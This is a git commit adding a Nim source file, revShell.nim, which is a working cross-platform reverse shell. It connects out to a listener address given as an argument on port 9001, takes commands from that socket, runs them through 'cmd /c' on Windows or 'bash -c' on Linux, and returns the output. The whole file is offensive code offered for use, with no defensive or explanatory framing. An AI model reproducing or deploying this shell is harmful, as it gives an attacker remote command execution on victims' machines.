357f9f4b148d52181283f013cced0c92f2dcdbad
Aaron Haymore <52760493+0xZon@users.noreply.github.com>
2022-01-07 23:17:44 -0700

    Create revShell.nim

---
+++ revShell.nim
@@ -0,0 +1,51 @@
+import os
+import net
+import osproc
+
+#Create a new variable called socket
+var socket = newSocket()
+
+proc shell(listener: string, port: int): void =
+
+    when system.hostOS == "windows":
+        echo "Running Windows Rev Shell"
+
+        try:
+            socket.connect(listener, PORT(port))
+
+            while true:
+                let cmd = socket.recvLine()
+                if cmd == "exit":
+                    break
+                let result = execProcess("cmd /c " & cmd)
+                socket.send(result)
+        except:
+            raise
+        finally:
+            socket.close
+
+    when system.hostOS == "linux":
+        echo "Running Linux Reverse Shell"
+
+        try:
+            socket.connect(listener, PORT(port))
+
+            while true:
+                let cmd = socket.recvLine()
+                if cmd == "exit":
+                    break
+                let result = execProcess("bash -c " & cmd)
+                socket.send(result)
+        except:
+            raise
+        finally:
+            socket.close
+
+
+when isMainModule:
+    try:
+        let port = 9001
+        let listener = paramStr(1)
+        shell(listener, port)
+    except:
+        raise
